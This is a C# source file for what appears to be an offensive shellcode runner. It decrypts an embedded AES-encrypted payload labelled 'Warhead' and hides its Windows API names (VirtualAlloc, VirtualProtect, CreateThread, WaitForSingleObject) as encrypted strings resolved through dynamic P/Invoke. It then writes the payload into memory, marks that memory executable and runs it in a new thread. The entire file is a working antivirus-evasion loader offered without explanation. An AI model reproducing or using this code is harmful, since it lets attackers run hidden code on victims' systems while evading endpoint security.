using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace AES_Shellcode_Runner_Dynamic_Invoke
{
    class Program
    {
        static string GlobalKey = "Ei+nZH9rnDeTLKOs01JHymxE9ykrGKKEcHpRj/G6CYE=";
        static string GlobalIV = "TFIXgOFnD1M7rn4p7FH8dg==";

        static byte[] dKernel32_dll_Bytes = new byte[16] { 0x79, 0xD5, 0x72, 0x4B, 0xE9, 0xC2, 0xC2, 0xF4, 0xCF, 0x65, 0xDF, 0x2C, 0x00, 0x5A, 0x12, 0xEF };
        static string dKernel32_dll = DecryptAESAsString(dKernel32_dll_Bytes, GlobalKey, GlobalIV);

        static byte[] dWaitForSingleObject_Bytes = new byte[32] { 0x04, 0xE0, 0xA6, 0x89, 0xF2, 0x1C, 0x47, 0x27, 0xB8, 0xC5, 0x72, 0x54, 0xA5, 0x82, 0x30, 0x51, 0x1B, 0x21, 0x0B, 0x05, 0x34, 0x59, 0x79, 0x16, 0x7D, 0xFB, 0x4A, 0x2A, 0xDC, 0xFD, 0xDC, 0xDC };
        static string dWaitForSingleObject = DecryptAESAsString(dWaitForSingleObject_Bytes, GlobalKey, GlobalIV);

        static byte[] dVirtualAlloc_Bytes = new byte[16] { 0x6A, 0xFA, 0x30, 0xB1, 0x08, 0x14, 0xEB, 0xE7, 0x77, 0x0A, 0x64, 0xDA, 0x3D, 0xE6, 0x96, 0x0B };
        static string dVirtualAlloc = DecryptAESAsString(dVirtualAlloc_Bytes, GlobalKey, GlobalIV);

        static byte[] dCreateThread_Bytes = new byte[16] { 0x3E, 0x8A, 0xE9, 0x4C, 0x0E, 0x6B, 0x25, 0x66, 0xD9, 0xE1, 0x9F, 0x44, 0x8A, 0xDB, 0xEE, 0x18 };
        static string dCreateThread = DecryptAESAsString(dCreateThread_Bytes, GlobalKey, GlobalIV);

        static byte[] dVirtualProtect_Bytes = new byte[16] { 0xD1, 0x56, 0xCC, 0x8E, 0x1D, 0x99, 0x18, 0xD8, 0x3C, 0xAD, 0xFA, 0x11, 0x18, 0xA4, 0x53, 0x54 };
        static string dVirtualProtect = DecryptAESAsString(dVirtualProtect_Bytes, GlobalKey, GlobalIV);

        static void Main(string[] args)
        {

            byte[] Warhead_Bytes = new byte[304] { 0x4C, 0x1E, 0x97, 0x81, 0xBC, 0xCD, 0x36, 0x58, 0x72, 0xCF, 0x42, 0x97, 0x7B, 0x5C, 0x81, 0x9B, 0x44, 0x43, 0x03, 0x2D, 0x81, 0xF1, 0x2F, 0x14, 0xA8, 0xD8, 0xB6, 0x13, 0x1F, 0x03, 0xC0, 0xC9, 0x06, 0x45, 0xE6, 0x0D, 0x00, 0x2A, 0x77, 0xFE, 0x0A, 0xC0, 0x51, 0xF1, 0x93, 0x0C, 0x5E, 0x6E, 0x1B, 0xC9, 0x2F, 0x6D, 0xD4, 0x10, 0xDD, 0x2F, 0x75, 0x9A, 0xB5, 0x5B, 0x22, 0x7C, 0x52, 0xD2, 0xB8, 0xC7, 0x9B, 0x02, 0xAC, 0x7E, 0xBF, 0x68, 0x83, 0xF9, 0xBB, 0x82, 0xD1, 0x65, 0xFC, 0xEB, 0x7C, 0xDB, 0xC8, 0x92, 0xFB, 0x53, 0x57, 0xA6, 0x54, 0x3B, 0x35, 0x5A, 0x38, 0x80, 0x61, 0x55, 0xE2, 0xC8, 0xDD, 0xDA, 0x14, 0x33, 0xB5, 0x4B, 0xB8, 0x34, 0xAE, 0x1C, 0x1D, 0x7C, 0xA9, 0x48, 0x9E, 0xB3, 0xAE, 0x5E, 0x6F, 0xD3, 0xA4, 0xA7, 0x9B, 0x78, 0xB2, 0x78, 0x3A, 0xF2, 0xFD, 0xE8, 0x52, 0xD0, 0x9B, 0xB6, 0x02, 0x8B, 0xEE, 0xA9, 0xEF, 0x63, 0xE3, 0x1F, 0xFA, 0x2A, 0x85, 0x01, 0xF3, 0xA5, 0x3D, 0xD7, 0x55, 0x79, 0x4F, 0xB4, 0xAE, 0x8A, 0x4D, 0x43, 0x27, 0x6D, 0xB3, 0xBA, 0x73, 0x6A, 0x2C, 0xCF, 0xA6, 0x03, 0x7B, 0x40, 0xC1, 0xFE, 0xDA, 0x6C, 0x33, 0x59, 0xD5, 0x3E, 0xC5, 0xBD, 0x86, 0xCF, 0x76, 0xC1, 0xF0, 0xF1, 0x5A, 0x3F, 0x39, 0x92, 0xD7, 0xBA, 0x5F, 0xDA, 0xD8, 0x81, 0x78, 0xF6, 0x30, 0x18, 0x70, 0xA2, 0x04, 0x44, 0xD7, 0xA1, 0xFE, 0xED, 0x9E, 0xB6, 0x29, 0xAB, 0x7F, 0x9E, 0x77, 0xF5, 0xDA, 0x14, 0x7D, 0xB5, 0xDA, 0x42, 0x8A, 0xB2, 0x9F, 0x36, 0x70, 0xC5, 0x72, 0x13, 0x1D, 0x9C, 0xB6, 0xA2, 0xC2, 0x66, 0xE8, 0xE7, 0x84, 0xEB, 0x03, 0x46, 0x8D, 0x79, 0xB8, 0x28, 0x02, 0x09, 0xAB, 0xCB, 0xCC, 0x61, 0x30, 0xBA, 0xE7, 0x41, 0x23, 0x43, 0xC1, 0xBD, 0x02, 0xE2, 0xAB, 0x67, 0xAC, 0xB2, 0xC7, 0xC4, 0x56, 0x32, 0x67, 0x37, 0xBE, 0x18, 0x99, 0x8A, 0x59, 0x98, 0x0C, 0x8E, 0xA8, 0xFE, 0xAA, 0x29, 0xC9, 0x99, 0x2C, 0x1F, 0x63, 0x7D, 0x5C, 0x32, 0x9E, 0x37, 0xC2, 0xAE, 0xCE, 0x40, 0x77, 0xB9, 0x28, 0x86, 0x83, 0x6B, 0x3F, 0xDF };
            byte[] Warhead = DecryptAESAsBytes(Warhead_Bytes, "MeV1w5NXp6srqE5/qDN0lSLfu9J4opVHRcoYR1mmBzk=", "hTFZdUSVkNnMMRnI5uG36A==");

            int size = Warhead.Length;
            IntPtr Address = fnVirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x04);

            Marshal.Copy(Warhead, 0, Address, size);

            uint oldProtect = 0;
            fnVirtualProtect(Address, (uint)size, 0x20, ref oldProtect);

            uint id = 0;
            IntPtr handleThread = fnCreateThread(0, 0, Address, IntPtr.Zero, 0, ref id);
            fnWaitForSingleObject(handleThread, 0xFFFFFFFF);
        }

        public static object DynamicInvoke(Type returnType, string library, string methodName, object[] arguments, Type[] parameterTypes)
        {
            var assemblyName = new AssemblyName("DynamicAssembly");
            var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

            var methodBuilder = moduleBuilder.DefinePInvokeMethod(
                methodName,
                library,
                MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
                CallingConventions.Standard,
                returnType,
                parameterTypes,
                CallingConvention.Winapi,
                CharSet.Ansi
            );

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();
            MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

            return dynamicMethod.Invoke(null, arguments);
        }

        public static IntPtr fnVirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint), typeof(uint), typeof(uint) };
            var argumentTypes = new object[] { lpAddress, dwSize, flAllocationType, flProtect };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dVirtualAlloc, argumentTypes, parameterTypes);
        }

        public static bool fnVirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, ref uint lpflOldProtect)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint), typeof(uint), typeof(uint).MakeByRefType() };
            var argumentTypes = new object[] { lpAddress, dwSize, flNewProtect, lpflOldProtect };
            return (bool)DynamicInvoke(typeof(bool), dKernel32_dll, dVirtualProtect, argumentTypes, parameterTypes);
        }

        public static IntPtr fnCreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId)
        {
            var parameterTypes = new Type[] { typeof(uint), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(uint).MakeByRefType() };
            var argumentTypes = new object[] { lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dCreateThread, argumentTypes, parameterTypes);
        }

        public static int fnWaitForSingleObject(IntPtr handle, uint wait)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint) };
            var argumentTypes = new object[] { handle, wait };
            return (int)DynamicInvoke(typeof(int), dKernel32_dll, dWaitForSingleObject, argumentTypes, parameterTypes);
        }

        static string DecryptAESAsString(byte[] data, string keyBase64, string ivBase64)
        {
            byte[] decryptedBytes = DecryptAESAsBytes(data, keyBase64, ivBase64);
            return Encoding.UTF8.GetString(decryptedBytes);
        }

        static byte[] DecryptAESAsBytes(byte[] data, string keyBase64, string ivBase64)
        {
            byte[] key = Convert.FromBase64String(keyBase64);
            byte[] iv = Convert.FromBase64String(ivBase64);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                using (MemoryStream memoryStream = new MemoryStream(data))
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                {
                    byte[] decryptedBytes = new byte[data.Length];
                    int decryptedByteCount = cryptoStream.Read(decryptedBytes, 0, decryptedBytes.Length);

                    byte[] result = new byte[decryptedByteCount];
                    Array.Copy(decryptedBytes, result, decryptedByteCount);
                    return result;
                }
            }
        }
    }
}
